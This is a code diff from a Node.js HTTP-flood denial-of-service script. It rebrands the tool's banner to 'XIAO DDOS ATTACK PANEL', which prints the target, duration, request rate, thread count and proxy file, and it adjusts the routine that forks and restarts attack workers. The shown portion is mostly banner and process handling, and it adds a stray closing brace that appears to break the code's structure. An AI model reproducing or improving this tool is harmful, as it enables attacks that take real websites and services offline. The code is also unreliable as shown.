@@ -214,30 +214,41 @@ const secureOptions =
  const MAX_RAM_PERCENTAGE = 80;
 const RESTART_DELAY = 1000;
 
- if (cluster.isMaster) {
-  console.clear()
-  console.log(`HTTP-FLOOD | BY @VENOM_CNC`.blue)
-  console.log(`Attack Successfully Sent`.red)
-  console.log(`--------------------------------------------`.gray)
-  console.log(` - Target: `.brightYellow + process.argv[2])
-  console.log(` - Time: `.brightYellow + process.argv[3])
-  console.log(` - Rate: `.brightYellow + process.argv[4])
-  console.log(` - Thread: `.brightYellow + process.argv[5])
-  console.log(` - ProxyFile: `.brightYellow + process.argv[6])
-  console.log(`--------------------------------------------`.gray)
-  console.log(`HTTP-FLOOD | HTTP 1/1 CUSTOM High RQ/S`.yellow)
+if (cluster.isMaster) {
+    console.clear();
+    console.log("██╗  ██╗████████╗██████╗  ██████╗ ███╗   ██╗███████╗████████╗".brightGreen);
+    console.log("██║  ██║╚══██╔══╝██╔══██╗██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝".brightGreen);
+    console.log("███████║   ██║   ██████╔╝██║   ██║██╔██╗ ██║█████╗     ██║   ".brightGreen);
+    console.log("██╔══██║   ██║   ██╔═══╝ ██║   ██║██║╚██╗██║██╔══╝     ██║   ".brightGreen);
+    console.log("██║  ██║   ██║   ██║     ╚██████╔╝██║ ╚████║███████╗   ██║   ".brightGreen);
+    console.log("╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ".brightGreen);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(`      HTTP-FLOOD | XIAO DDOS ATTACK PANEL`.red.bold);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` >> Target       : `.brightYellow + process.argv[2]);
+    console.log(` >> Duration     : `.brightYellow + process.argv[3] + " seconds");
+    console.log(` >> Rate         : `.brightYellow + process.argv[4] + " req/s");
+    console.log(` >> Threads      : `.brightYellow + process.argv[5]);
+    console.log(` >> Proxy File   : `.brightYellow + process.argv[6]);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log(` [!] Attack launched successfully`.brightRed);
+    console.log("═════════════════════════════════════════════════════════════".gray);
+    console.log("XIAO DDOS | HIGH RQ/S HTTP-FLOOD CUSTOM".yellow.bold);
+    
     const restartScript = () => {
         for (const id in cluster.workers) {
             cluster.workers[id].kill();
         }
 
-        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
+        console.log(`[>] Restarting the script in ${RESTART_DELAY} ms...`.brightCyan);
         setTimeout(() => {
             for (let counter = 1; counter <= args.threads; counter++) {
                 cluster.fork();
             }
         }, RESTART_DELAY);
     };
+}
+
 
     const handleRAMUsage = () => {
         const totalRAM = os.totalmem();
